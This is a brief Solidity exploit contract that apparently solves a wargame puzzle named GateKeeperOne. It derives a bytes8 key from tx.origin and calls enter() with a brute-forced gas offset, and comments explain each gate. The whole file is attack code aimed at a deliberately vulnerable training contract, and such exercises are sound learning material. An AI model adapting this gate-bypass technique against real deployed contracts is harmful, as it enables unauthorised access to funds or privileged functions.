pragma solidity ^0.8.0;

interface GateKeeperOne {
    function enter(bytes8) external returns (bool);
}
      
      // for firstKeep you just need to use another contract
contract expl {
	function pwn(address _t, uint gas) external {
		GateKeeperOne t = GateKeeperOne(_t);
                        
                        // the checks for thirdKeep
		uint16 third_check = uint16(uint160(tx.origin)); 
		uint64 first_check = uint64(1 << 63) + uint64(third_check);
		bytes8 key = bytes8(first_check);
                
                // we will using the amount of gas required for "enter" function hence
                // it will be subtracted when we actually call it
		require(gas < 8191, "gas >= 8191");
		require(t.enter{gas: 8191 * 10 + gas}(key), "???");
                // for gas you can bruteforce from 1-8191 using try and catch
                // until it is successful and use the following value
                // which in case here is 256
	}
}
